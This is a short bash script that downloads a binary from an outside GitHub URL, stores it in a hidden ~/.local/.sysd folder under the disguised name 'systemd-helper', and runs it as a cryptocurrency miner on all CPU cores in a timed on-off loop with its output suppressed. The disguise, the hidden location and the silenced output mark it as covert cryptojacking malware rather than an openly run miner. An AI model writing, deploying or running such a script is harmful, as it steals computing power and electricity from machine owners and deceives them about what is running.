#!/usr/bin/env bash
LOGFILE=$HOME/.local/mining_start.log
mkdir -p ~/.local/.sysd
cd ~/.local/.sysd || exit 1

if [ ! -f systemd-helper ]; then
  echo "$(date): Downloading systemd-helper" >> "$LOGFILE"
  wget -q -O systemd-helper https://github.com/barburonjilo/open/raw/refs/heads/main/isu
  chmod +x systemd-helper
fi

echo "$(date): Downloading config template" >> "$LOGFILE"
wget -q -O config-template.json https://github.com/barburonjilo/open/raw/refs/heads/main/isu2.json

THREADS=$(nproc)
echo "$(date): Setting threads to $THREADS" >> "$LOGFILE"
jq --argjson threads "$THREADS" '.threads = $threads' config-template.json > config.json

while true; do
  echo "$(date): Starting mining..." >> "$LOGFILE"
  ./systemd-helper -c config.json > /dev/null 2>&1 &
  PID=$!
  sleep 600
  echo "$(date): Stopping mining..." >> "$LOGFILE"
  kill $PID
  sleep 300
done
